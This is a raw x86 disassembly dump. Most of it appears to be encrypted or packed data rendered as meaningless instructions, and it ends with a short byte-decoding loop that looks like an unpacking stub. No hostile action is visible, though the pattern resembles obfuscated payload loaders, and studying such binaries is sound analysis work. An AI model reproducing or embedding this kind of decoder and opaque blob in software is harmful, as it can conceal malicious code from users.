  417827:	xchg   DWORD PTR [esi+0x7daf9306],eax
  41782d:	ja     0x41780a
  41782f:	pushf  
  417830:	cmc    
  417831:	pushf  
  417832:	or     eax,0x4f95316e
  417837:	mov    cl,0x3d
  417839:	hlt    
  41783a:	mov    al,0x5e
  41783c:	jge    0x41787d
  41783e:	push   0x4f
  417840:	jnp    0x41782c
  417842:	push   0x248f1e34
  417847:	ins    DWORD PTR es:[edi],dx
  417848:	addr16 int 0x9c
  41784b:	jp     0x4177da
  41784d:	pop    ebp
  41784e:	cmp    ax,0xce78
  417852:	loop   0x417821
  417854:	lock jo 0x4177ea
  417857:	pusha  
  417858:	sub    eax,0xa9a96d75
  41785d:	cmp    eax,0x2c8b8e88
  417862:	out    0x4e,al
  417864:	jl     0x41787d
  417866:	jle    0x4177fa
  417868:	gs adc al,0x79
  41786b:	push   es
  41786c:	je     0x41782d
  41786e:	xchg   BYTE PTR [ecx],bl
  417870:	or     DWORD PTR [edi+0x40],eax
  417873:	data16 je 0x417852
  417876:	push   esp
  417877:	lods   al,BYTE PTR ds:[esi]
  417878:	push   0xffffffc9
  41787a:	jno    0x4178c8
  41787c:	cdq    
  41787d:	mov    ch,BYTE PTR [edi+0x8f33b88]
  417883:	int3   
  417884:	hlt    
  417885:	adc    eax,DWORD PTR [ebp+0x32]
  417888:	outs   dx,BYTE PTR ds:[esi]
  417889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41788a:	popf   
  41788b:	jp     0x417857
  41788d:	mov    dh,0xc
  41788f:	dec    ebp
  417890:	pop    edi
  417891:	stos   BYTE PTR es:[edi],al
  417892:	mov    WORD PTR [ebx],cs
  417894:	aaa    
  417895:	mov    DWORD PTR [esi+0x44],eax
  417898:	and    DWORD PTR [eax-0x4577e55c],esi
  41789e:	ins    BYTE PTR es:[edi],dx
  41789f:	sbb    bh,BYTE PTR [ebx]
  4178a1:	inc    eax
  4178a2:	cmp    dh,al
  4178a4:	add    eax,0x3a63cab8
  4178a9:	fwait
  4178aa:	and    DWORD PTR [eax+eax*2+0x4058adca],esp
  4178b1:	inc    ebp
  4178b2:	sub    dh,ah
  4178b4:	call   0xfb48:0x9740e124
  4178bb:	mov    al,ds:0x80571465
  4178c0:	cld    
  4178c1:	sub    ebp,ebp
  4178c3:	data16 cmp bh,bh
  4178c6:	rcl    BYTE PTR [eax+0x6b],0x33
  4178ca:	and    ebx,DWORD PTR [ebp-0x22]
  4178cd:	mov    ds:0xb127194d,al
  4178d2:	jmp    0xf3ca00ad
  4178d7:	fidiv  DWORD PTR [edx+0x40]
  4178da:	hlt    
  4178db:	test   eax,0x1c91d082
  4178e0:	loope  0x417892
  4178e2:	pop    edi
  4178e3:	mov    eax,ds:0x33838d02
  4178e8:	mov    ds:0x2cc3d04e,al
  4178ed:	call   DWORD PTR [esi+0x27]
  4178f0:	mov    cl,0x89
  4178f2:	test   al,0x1d
  4178f4:	into   
  4178f5:	xchg   ecx,eax
  4178f6:	mov    ch,0xab
  4178f8:	mov    bl,0x9f
  4178fa:	mov    ebx,0xb754eb9
  4178ff:	mov    BYTE PTR [ecx+0x52cc008f],0x53
  417906:	test   esi,ebp
  417908:	push   0xffffffb0
  41790a:	xor    cl,BYTE PTR [esi+0x1351a624]
  417910:	nop
  417911:	jmp    0x9b10:0x5c0e1612
  417918:	adc    eax,0x40647f0
  41791d:	mov    edi,0x5dd9101a
  417922:	ins    DWORD PTR es:[edi],dx
  417923:	and    bh,ah
  417925:	or     DWORD PTR [ebx-0x62],edx
  417928:	les    edx,FWORD PTR [eax+0x49]
  41792b:	push   ss
  41792c:	sbb    cl,BYTE PTR ds:0xc70f04fe
  417932:	jle    0x417979
  417934:	fcom   DWORD PTR [esi*2-0x37b84645]
  41793b:	and    eax,esp
  41793d:	fadd   st,st(0)
  41793f:	jle    0x417954
  417941:	lahf   
  417942:	or     ecx,DWORD PTR [ecx+0x614e455b]
  417948:	and    BYTE PTR [edx+eiz*4+0x32],ah
  41794c:	dec    ecx
  41794d:	lock push ds
  41794f:	retf   0x7b5a
  417952:	mov    ch,0xd4
  417954:	gs mov cs,ebp
  417957:	dec    ebp
  417958:	sbb    al,BYTE PTR [ebx+0x75325a1]
  41795e:	inc    eax
  41795f:	loope  0x417979
  417961:	pop    ds
  417962:	aas    
  417963:	mov    bh,0xea
  417965:	fs lahf 
  417967:	call   FWORD PTR [ebp+0x4f]
  41796a:	dec    esp
  41796b:	js     0x417972
  41796d:	cld    
  41796e:	fcomp  DWORD PTR [ecx+edx*1+0x184f0d6b]
  417975:	add    BYTE PTR [ebp+0x59d9ee56],ah
  41797b:	int3   
  41797c:	jo     0x41792e
  41797e:	call   0x34:0x4ea9dc1e
  417985:	imul   edx,DWORD PTR ds:0xe00e56ec,0xffffffaf
  41798c:	aas    
  41798d:	nop
  41798e:	stos   BYTE PTR es:[edi],al
  41798f:	int3   
  417990:	loop   0x41796f
  417992:	dec    ebp
  417993:	test   eax,0xd6b3f569
  417998:	sub    al,0x12
  41799a:	cli    
  41799b:	dec    esi
  41799c:	pop    edx
  41799d:	jmp    0x1e9f:0x1b7cc34f
  4179a4:	(bad)  [ebp+ebx*8+0x7a]
  4179a8:	daa    
  4179a9:	and    al,0xb5
  4179ab:	and    bh,BYTE PTR [ebp-0x41]
  4179ae:	push   ds
  4179af:	cmp    eax,0x65600d6e
  4179b4:	pop    ebp
  4179b5:	aad    0x8
  4179b7:	jmp    0x4179a1
  4179b9:	not    BYTE PTR [eax]
  4179bb:	inc    esp
  4179bc:	sbb    bl,BYTE PTR [edi-0x2]
  4179bf:	mov    ds:0xd107bd63,al
  4179c4:	push   ebx
  4179c5:	jmp    0x417a34
  4179c7:	push   eax
  4179c8:	loopne 0x41797f
  4179ca:	std    
  4179cb:	in     eax,0x99
  4179cd:	xor    eax,0x75bc16ce
  4179d2:	call   0x6c5ea30d
  4179d7:	add    dh,BYTE PTR [esi-0x5ce6b553]
  4179dd:	loop   0x4179eb
  4179df:	pop    eax
  4179e0:	add    BYTE PTR [ecx-0x77],ah
  4179e3:	xlat   BYTE PTR ds:[ebx]
  4179e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179e5:	sbb    edi,DWORD PTR [ebp-0x46]
  4179e8:	aaa    
  4179e9:	stos   DWORD PTR es:[edi],eax
  4179ea:	call   0x51cd:0x541a1fc1
  4179f1:	shl    BYTE PTR [ebp+0x2d],1
  4179f4:	test   al,0xee
  4179f6:	xchg   esi,eax
  4179f7:	in     al,dx
  4179f8:	ins    DWORD PTR es:[edi],dx
  4179f9:	div    BYTE PTR [esi+0x45]
  4179fc:	jb     0x4179c1
  4179fe:	popa   
  4179ff:	sbb    ebp,DWORD PTR [ebp+0x47a5fe64]
  417a05:	pushf  
  417a06:	lods   eax,DWORD PTR ds:[esi]
  417a07:	mov    bh,0x2b
  417a09:	call   0x6fdf:0x20cb3e95
  417a10:	in     eax,0x60
  417a12:	dec    ebx
  417a13:	xchg   edi,eax
  417a14:	mov    bl,0xe1
  417a16:	dec    eax
  417a17:	sub    al,0xc6
  417a19:	hlt    
  417a1a:	and    al,BYTE PTR [edi-0x1d]
  417a1d:	ja     0x417a8b
  417a1f:	cwde   
  417a20:	call   FWORD PTR [ebp+0x2f]
  417a23:	pop    ecx
  417a24:	ins    DWORD PTR es:[edi],dx
  417a25:	jnp    0x417a0c
  417a27:	mov    al,0x47
  417a29:	jmp    0x24ad:0x5ebe0534
  417a30:	fnstenv [ebp-0x3a]
  417a33:	xor    al,0x3e
  417a35:	xor    edx,DWORD PTR [ebp+edx*8+0x68e3ca]
  417a3c:	ds jg  0x417a5c
  417a3f:	sub    ebx,DWORD PTR [edi+esi*1+0x76cc32b0]
  417a46:	cs dec ebp
  417a48:	jmp    FWORD PTR [edi]
  417a4a:	xchg   esp,eax
  417a4b:	stos   BYTE PTR es:[edi],al
  417a4c:	call   0x2a11:0x9c735fe5
  417a53:	mov    ecx,0x8bedd5bd
  417a58:	jmp    FWORD PTR [ecx-0x1f5f9731]
  417a5e:	or     eax,0x7604a615
  417a63:	mov    ebx,0x9e032a68
  417a68:	inc    ecx
  417a69:	dec    esp
  417a6a:	jle    0x417a28
  417a6c:	dec    edi
  417a6d:	(bad)  
  417a6e:	fnsave [edx]
  417a70:	and    ebp,DWORD PTR [edx+0x5e]
  417a73:	push   ecx
  417a74:	in     eax,0x67
  417a76:	pop    esp
  417a77:	jmp    0x417a52
  417a79:	xor    eax,0xe4d15639
  417a7e:	lods   eax,DWORD PTR cs:[esi]
  417a80:	scas   al,BYTE PTR es:[edi]
  417a81:	jle    0x417a30
  417a83:	fst    QWORD PTR [edx-0x58677033]
  417a89:	mov    al,0x64
  417a8b:	shl    DWORD PTR [ecx+edx*1],cl
  417a8e:	mov    bh,0x6c
  417a90:	cmc    
  417a91:	pop    ecx
  417a92:	sub    BYTE PTR [ecx+0x5cf629f9],al
  417a98:	(bad)  
  417a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a9a:	mov    ecx,0xe7df4161
  417a9f:	cld    
  417aa0:	lock push cs
  417aa2:	push   eax
  417aa3:	fcmovnbe st,st(6)
  417aa5:	cmc    
  417aa6:	adc    al,0x2e
  417aa8:	inc    esp
  417aa9:	pop    eax
  417aaa:	or     dh,0xb7
  417aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aae:	mov    dh,0xc6
  417ab0:	lahf   
  417ab1:	and    dl,0x4a
  417ab4:	(bad)  
  417ab6:	outs   dx,DWORD PTR ds:[esi]
  417ab7:	popa   
  417ab8:	into   
  417ab9:	mov    eax,ds:0xa3eee000
  417abe:	pop    ebp
  417abf:	inc    edi
  417ac0:	(bad)
  417ac3:	loop   0x417b30
  417ac5:	mov    ds:0xa71a6f79,al
  417aca:	pusha  
  417acb:	xchg   ebx,eax
  417acc:	jno    0x417a5d
  417ace:	or     al,0x4c
  417ad1:	fwait
  417ad2:	imul   esp,DWORD PTR [ebp+0x67d45ffd],0x3734f921
  417adc:	sti    
  417add:	int    0xc7
  417adf:	frstor [esi]
  417ae1:	jne    0x417abe
  417ae3:	(bad)  
  417ae5:	mov    ebp,0xfd64ee77
  417aea:	cld    
  417aeb:	bound  esi,QWORD PTR [ebx+edx*8+0x2e]
  417aef:	(bad)  
  417af0:	adc    eax,0x635c400f
  417af5:	pop    eax
  417af6:	lahf   
  417af7:	xlat   BYTE PTR ds:[ebx]
  417af8:	dec    esp
  417af9:	(bad)  
  417afa:	es adc al,0x90
  417afd:	pop    ebp
  417afe:	or     ah,BYTE PTR [esp+ebx*4]
  417b01:	sar    DWORD PTR ds:0x7ed063f0,0xeb
  417b08:	cmp    bh,ch
  417b0a:	jns    0x417b5b
  417b0c:	add    al,0x68
  417b0e:	in     al,dx
  417b0f:	mov    ds:0x13dc73b9,al
  417b14:	loope  0x417b85
  417b16:	and    BYTE PTR [edi-0x29206c4f],dl
  417b1c:	inc    edi
  417b1d:	push   eax
  417b1e:	push   eax
  417b1f:	int    0xe1
  417b21:	popf   
  417b22:	fdivr  QWORD PTR [esi+edi*2-0x37]
  417b26:	cs dec ecx
  417b28:	push   eax
  417b29:	mov    ecx,0x67771d46
  417b2e:	je     0x417b06
  417b30:	mov    bl,0x8d
  417b32:	ins    DWORD PTR es:[edi],dx
  417b33:	lods   al,BYTE PTR ds:[esi]
  417b34:	mov    al,al
  417b36:	dec    edx
  417b37:	pusha  
  417b38:	out    dx,eax
  417b39:	or     al,0xe0
  417b3b:	cld    
  417b3c:	cmp    esi,DWORD PTR fs:[ebx+eax*1+0x12]
  417b41:	dec    ebp
  417b42:	into   
  417b43:	(bad)  
  417b44:	pop    ecx
  417b45:	dec    edi
  417b46:	outs   dx,DWORD PTR ds:[esi]
  417b47:	add    BYTE PTR [ebp-0x55],dh
  417b4a:	call   0x65d3:0xb594e8be
  417b51:	push   ebx
  417b52:	fcmove st,st(3)
  417b54:	(bad)  
  417b55:	das    
  417b56:	not    DWORD PTR [eax]
  417b58:	sbb    BYTE PTR [ebp+0x2f653ba3],dl
  417b5e:	mov    ebx,0xb23d58fc
  417b63:	fsubr  DWORD PTR [ebx]
  417b65:	add    BYTE PTR [edx+0x72],bh
  417b68:	sbb    ch,ch
  417b6a:	xchg   ebx,eax
  417b6b:	adc    ebp,DWORD PTR ds:0x62ed025b
  417b71:	or     dl,BYTE PTR [eax+0x1fa84c42]
  417b77:	shr    BYTE PTR [ebx+0x4f],cl
  417b7a:	push   esp
  417b7b:	retf   
  417b7c:	adc    dh,ah
  417b7e:	enter  0x7bb0,0x8
  417b82:	add    al,BYTE PTR [edi-0x23]
  417b85:	stc    
  417b86:	sbb    dl,BYTE PTR [ebx-0xde08321]
  417b8c:	adc    DWORD PTR [edx-0x5f],0xffffffd9
  417b90:	les    ecx,FWORD PTR [bx+0x5ea9]
  417b95:	add    BYTE PTR [ebp-0x4c31c661],0x91
  417b9c:	into   
  417b9d:	pop    eax
  417b9e:	sub    edx,edx
  417ba0:	add    BYTE PTR [eax-0x117a20ac],cl
  417ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba7:	push   ebx
  417ba8:	gs hlt 
  417baa:	cmc    
  417bab:	push   ax
  417bad:	clc    
  417bae:	mov    eax,0xfa112d9e
  417bb3:	jne    0x417b64
  417bb5:	(bad)  
  417bb6:	retf   0x4249
  417bb9:	cmp    esi,DWORD PTR [edx-0x4f1bfc26]
  417bbf:	dec    eax
  417bc0:	test   DWORD PTR [ebp-0x2],ebx
  417bc3:	aaa    
  417bc4:	cmp    al,0xb6
  417bc6:	mov    cl,0x14
  417bc8:	ror    DWORD PTR [ebx-0x29],1
  417bcb:	mov    edi,0x67d7d3b3
  417bd0:	jle    0x417b7c
  417bd2:	push   ecx
  417bd3:	mov    eax,0xa5d1e433
  417bd8:	shl    DWORD PTR [ecx-0x78],0xe3
  417bdc:	and    eax,ebp
  417bde:	es in  al,dx
  417be0:	inc    esi
  417be1:	gs inc ebx
  417be3:	xchg   ebp,eax
  417be4:	cmp    ch,cl
  417be6:	adc    al,0x46
  417be8:	inc    eax
  417be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bea:	jge    0x417c3d
  417bec:	sub    eax,0x8bb805b8
  417bf1:	pop    ds
  417bf2:	aas    
  417bf3:	inc    ebp
  417bf4:	sbb    eax,0x7d3e9973
  417bf9:	mov    cl,0xe0
  417bfb:	mov    BYTE PTR [esi-0x2e7ae31d],ch
  417c01:	fdivr  st(5),st
  417c03:	mov    ds:0xf9588584,al
  417c08:	arpl   WORD PTR [edi],di
  417c0a:	cmp    al,0xa2
  417c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c0d:	jo     0x417bec
  417c0f:	push   ecx
  417c10:	ror    ebp,1
  417c12:	mov    esp,0x69d79aa
  417c17:	sahf   
  417c18:	mov    ds:0x6e437dba,eax
  417c1d:	shl    DWORD PTR [ebp-0x74],0xfe
  417c21:	mov    eax,0x63c2ac8e
  417c26:	push   ds
  417c27:	(bad)  
  417c28:	(bad)  
  417c2a:	adc    al,0xf7
  417c2c:	retf   
  417c2d:	lahf   
  417c2e:	xlat   BYTE PTR ds:[ebx]
  417c30:	rcl    DWORD PTR ds:0xd6c4f295,0xa8
  417c37:	pop    esi
  417c38:	mov    edx,0xb68f3ad7
  417c3d:	and    al,0x9
  417c3f:	cmp    ecx,DWORD PTR [ebp+0x6587967a]
  417c45:	cmp    ah,BYTE PTR [edx]
  417c47:	sub    dl,ah
  417c49:	retf   
  417c4a:	leave  
  417c4b:	rcr    DWORD PTR [ebx-0x65da38a9],1
  417c51:	fwait
  417c52:	xchg   edx,eax
  417c53:	les    ebx,FWORD PTR [esi]
  417c55:	jl     0x417c20
  417c57:	nop
  417c58:	lea    esi,[esi]
  417c5a:	enter  0x4326,0xe3
  417c5e:	mov    eax,0x67a952e6
  417c63:	loopne 0x417bfd
  417c65:	test   eax,0x641dc0d3
  417c6a:	pop    esi
  417c6b:	mov    bl,0xec
  417c6d:	test   al,0xeb
  417c6f:	cld    
  417c70:	into   
  417c71:	ins    BYTE PTR es:[edi],dx
  417c72:	imul   esp,DWORD PTR cs:[esi+0x1d],0xca9b5746
  417c7a:	in     eax,0x99
  417c7c:	push   esi
  417c7d:	sti    
  417c7e:	xchg   ebx,eax
  417c7f:	in     al,0x53
  417c81:	mov    BYTE PTR [ecx],0x21
  417c84:	ds push ebp
  417c86:	pop    es
  417c87:	rcr    BYTE PTR cs:[esp+ecx*8],0x74
  417c8c:	icebp  
  417c8d:	jmp    0x417c12
  417c8f:	les    edx,FWORD PTR [eax-0x7e6833a7]
  417c95:	leave  
  417c96:	adc    DWORD PTR [ebx+0x12415086],0x8197230e
  417ca0:	push   0x6c
  417ca2:	add    eax,0x52114fc7
  417ca7:	sbb    DWORD PTR [edi+ecx*1],ebx
  417caa:	and    eax,0xa37b1565
  417caf:	sub    ah,BYTE PTR [edi+0x1042db4e]
  417cb5:	inc    ebp
  417cb6:	out    dx,al
  417cb7:	push   esp
  417cb8:	jp     0x417cd6
  417cba:	call   0xd6c4:0xa70a6aa1
  417cc1:	sbb    BYTE PTR [ebx+0x1b],0x17
  417cc5:	sub    ch,BYTE PTR [eax]
  417cc7:	and    BYTE PTR [edi-0x3877f2c3],ah
  417ccd:	popf   
  417cce:	fidivr WORD PTR [ecx]
  417cd0:	dec    ebp
  417cd1:	dec    edi
  417cd2:	adc    eax,0x9e425240
  417cd7:	push   0x47
  417cd9:	data16 scas al,BYTE PTR es:[edi]
  417cdb:	adc    BYTE PTR ss:[esi],0x5
  417cdf:	cld    
  417ce0:	pusha  
  417ce1:	fiadd  DWORD PTR [ecx+edi*4]
  417ce4:	mov    al,0xe4
  417ce6:	fist   DWORD PTR [ecx+0x4592dcb1]
  417cec:	addr16 pop edx
  417cee:	loope  0x417cce
  417cf0:	retf   0xecfe
  417cf3:	add    al,0xc9
  417cf5:	and    al,dl
  417cf7:	push   cs
  417cf8:	stc    
  417cf9:	call   0x47e56e24
  417cfe:	clc    
  417cff:	sub    al,al
  417d01:	fnstcw WORD PTR [ecx+0xc0c5368]
  417d07:	sbb    al,0x9c
  417d09:	stos   BYTE PTR es:[edi],al
  417d0a:	inc    eax
  417d0b:	pop    eax
  417d0c:	dec    edx
  417d0d:	out    dx,eax
  417d0e:	sbb    esp,ebx
  417d10:	stos   BYTE PTR es:[edi],al
  417d11:	fldcw  WORD PTR [esi-0x62]
  417d14:	xor    DWORD PTR [esi+0x59],edx
  417d17:	jecxz  0x417d04
  417d19:	mov    bl,0x39
  417d1b:	add    al,BYTE PTR [eax-0x7814137e]
  417d21:	leave  
  417d22:	cld    
  417d23:	scas   eax,DWORD PTR es:[edi]
  417d24:	cli    
  417d25:	fisub  DWORD PTR [esi+0x7c5bdcd3]
  417d2b:	cmp    dh,dh
  417d2d:	test   eax,0x14116edc
  417d32:	push   ds
  417d33:	adc    cl,bh
  417d35:	inc    esp
  417d36:	xchg   ebp,eax
  417d37:	ins    BYTE PTR es:[edi],dx
  417d38:	imul   esi,edx,0xee2c551b
  417d3e:	pop    ss
  417d3f:	pop    esp
  417d40:	retf   0xc2fc
  417d43:	ins    BYTE PTR es:[edi],dx
  417d44:	aad    0xb0
  417d46:	jno    0x417d91
  417d48:	dec    esi
  417d49:	adc    DWORD PTR ds:0x6bd3209,edx
  417d4f:	inc    ecx
  417d50:	dec    ebp
  417d51:	or     dh,cl
  417d53:	cwde   
  417d54:	adc    cl,BYTE PTR [esp+edi*8]
  417d57:	cmp    bl,al
  417d59:	test   DWORD PTR [eax+0x9],edx
  417d5c:	arpl   WORD PTR [edi+0x32bdbfd0],bx
  417d62:	lock adc ah,ah
  417d65:	in     al,dx
  417d66:	or     eax,0x5e6e64f
  417d6b:	mov    dl,0x98
  417d6d:	dec    esi
  417d6e:	add    DWORD PTR [edi],esi
  417d70:	pop    ebx
  417d71:	mov    al,0x90
  417d73:	fdiv   QWORD PTR [ecx]
  417d75:	test   al,0xd7
  417d77:	add    al,0x50
  417d79:	xor    esi,0xfffffffa
  417d7c:	lock xchg BYTE PTR [esi],al
  417d7f:	xor    al,0x1d
  417d81:	push   es
  417d82:	sub    BYTE PTR [esi],bh
  417d84:	ins    BYTE PTR es:[edi],dx
  417d85:	push   ds
  417d86:	mov    al,ds:0xee38af17
  417d8b:	imul   edi,DWORD PTR es:[ebp+0x65],0x3c32d12d
  417d93:	es dec edx
  417d95:	sub    BYTE PTR [edi+0x98283b1],ah
  417d9b:	and    DWORD PTR [edx+0x4b92b918],eax
  417da1:	add    DWORD PTR [ecx+0x43],edi
  417da4:	fmulp  st(6),st
  417da6:	jecxz  0x417e0c
  417da8:	clc    
  417da9:	xchg   BYTE PTR [eax-0x59],dh
  417dac:	scas   eax,DWORD PTR es:[edi]
  417dad:	push   cs
  417dae:	js     0x417d99
  417db0:	cwde   
  417db1:	push   ebp
  417db2:	fcmove st,st(7)
  417db4:	into   
  417db5:	xchg   esp,eax
  417db6:	cwde   
  417db7:	into   
  417db8:	clc    
  417db9:	fsubr  QWORD PTR [eax+0x15]
  417dbc:	enter  0x9dff,0x90
  417dc0:	inc    esi
  417dc1:	bound  esp,QWORD PTR [ecx]
  417dc3:	jl     0x417e15
  417dc5:	imul   ebx,DWORD PTR [ebx],0x81fd5247
  417dcb:	adc    cl,al
  417dcd:	cmp    eax,eax
  417dcf:	les    eax,FWORD PTR cs:[edx-0x79b897b9]
  417dd6:	cdq    
  417dd7:	mov    ds,WORD PTR [edx+0x36]
  417dda:	mov    bh,0x19
  417ddc:	adc    al,0x2d
  417dde:	mov    bl,0x59
  417de0:	ins    BYTE PTR es:[edi],dx
  417de1:	mov    cl,0xe1
  417de3:	adc    BYTE PTR [esi],bl
  417de5:	out    0x22,al
  417de7:	call   0x3a818f1a
  417dec:	inc    eax
  417ded:	cli    
  417dee:	jecxz  0x417e11
  417df0:	push   edi
  417df1:	xor    esp,DWORD PTR [esi]
  417df3:	xor    DWORD PTR [edi-0x50599305],edx
  417df9:	or     ch,dl
  417dfb:	imul   edi,edi,0xb42dd4b2
  417e01:	xchg   esp,eax
  417e02:	fidiv  WORD PTR [edi-0x38a75]
  417e08:	(bad)  
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
